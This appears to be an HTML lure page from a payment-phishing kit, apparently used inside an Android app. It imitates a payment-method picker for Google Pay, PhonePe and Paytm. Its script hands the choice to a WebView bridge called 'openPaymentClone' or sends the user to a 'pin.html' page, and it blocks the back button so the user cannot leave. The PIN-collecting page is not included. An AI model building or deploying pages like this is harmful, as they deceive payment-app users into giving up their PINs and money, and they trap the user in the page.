<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Select Payment Method</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      background: #f5f5f5;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    .payment-methods {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 20px;
    }
    .payment-method {
      display: flex;
      align-items: center;
      padding: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      cursor: pointer;
    }
    .payment-method:hover {
      border-color: #ff1493;
    }
    .payment-method img {
      width: 50px;
      height: 50px;
      margin-right: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Select Payment Method</h2>
    <div class="payment-methods">
      <div class="payment-method" onclick="selectPayment('gpay')">
        <img src="google-pay-icon.png" alt="Google Pay">
        <span>Google Pay</span>
      </div>
      <div class="payment-method" onclick="selectPayment('phonepe')">
        <img src="phonepe-icon.png" alt="PhonePe">
        <span>PhonePe</span>
      </div>
      <div class="payment-method" onclick="selectPayment('paytm')">
        <img src="paytm-icon.png" alt="Paytm">
        <span>Paytm</span>
      </div>
    </div>
  </div>
  
  <script>
    function selectPayment(method) {
      if (typeof Android !== 'undefined' && Android.openPaymentClone) {
        Android.openPaymentClone(method);
      } else {
        window.location.href = 'pin.html';
      }
    }
    
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>
</body>
</html>
